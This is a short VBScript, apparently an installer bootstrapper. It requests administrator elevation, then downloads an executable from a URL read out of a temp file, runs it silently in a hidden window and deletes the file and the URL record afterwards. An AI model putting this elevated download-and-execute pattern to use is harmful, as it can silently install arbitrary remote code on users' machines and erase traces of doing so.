' Check if running with elevated privileges
If Not WScript.Arguments.Named.Exists("elevated") Then
    ' Restart with elevation
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    WScript.Quit
End If

' Main installation code
Dim objShell, objFSO, urlFile, installerPath, downloadUrl, objHTTP, objStream

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Read URL from file
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
urlFile = tempPath & "\download_url.txt"
installerPath = tempPath & "\installer.exe"

Set objFile = objFSO.OpenTextFile(urlFile, 1)
downloadUrl = objFile.ReadAll
objFile.Close

' Download file with proper error handling
On Error Resume Next
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "GET", downloadUrl, False
objHTTP.Send

' Handle redirects
If objHTTP.Status >= 300 And objHTTP.Status < 400 Then
    finalUrl = objHTTP.getResponseHeader("Location")
    objHTTP.Open "GET", finalUrl, False
    objHTTP.Send
End If

' Save file
If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile installerPath, 2
    objStream.Close
    
    ' Run installer silently with admin privileges
    objShell.Run """" & installerPath & """ /S", 0, True
    
    ' Clean up
    objFSO.DeleteFile installerPath, True
    objFSO.DeleteFile urlFile, True
End If
